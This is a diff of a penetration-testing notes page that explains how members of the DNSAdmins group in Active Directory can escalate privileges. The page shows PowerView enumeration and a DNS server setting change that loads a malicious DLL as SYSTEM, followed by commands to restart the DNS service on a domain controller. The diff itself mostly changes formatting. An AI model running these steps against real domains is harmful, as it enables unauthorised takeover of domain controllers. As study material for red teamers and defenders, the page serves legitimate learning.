@@ -2,21 +2,21 @@
 
 Using DNS Admins for privilege escalation in Active Directory with PowerView and Mimikatz. The technique abuses the privileges given by default to the members of the DNS Admins group.
 
-{% hint style="warning" %}
-This technique is very risky and easily detectable as it requires a restart in DNS service.&#x20;
+{% hint style="danger" %}
+**OPSEC NOTE :** this technique is very risky and easily detectable as it requires a restart in DNS service.&#x20;
 {% endhint %}
 
 ### <mark style="color:orange;">Conditions</mark>
 
-* **Members of the DNS Admins group can load arbitrary DLL’s with the privileges of dns.exe (SYSTEM)**
-* **If the DC serves as DNS server, we can escalate to DA**
-* **But: need to be able to restart the DNS on the DC !!!**
+* <mark style="color:green;">**Members of the DNS Admins group can load arbitrary DLL’s with the privileges of dns.exe (SYSTEM)**</mark>
+* <mark style="color:green;">**If the DC serves as DNS server, we can escalate to DA**</mark>
+* <mark style="color:green;">**But: need to be able to restart the DNS on the DC !!!**</mark>
 
 ### <mark style="color:orange;">Exploitation</mark>
 
 The attack vector consists of injecting a malicious DLL into the DNS process running as a System to escalate when the service restarts.
 
-```
+```powershell
 # Enumerate members of DNSAdmins group
 # Using PowerView 3.0
 Get-DomainGroupMember "DNSAdmins"
@@ -37,4 +37,3 @@ Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
 sc \\dcorp-dc stop dns
 sc \\dcorp-dc start dns
 ```
-
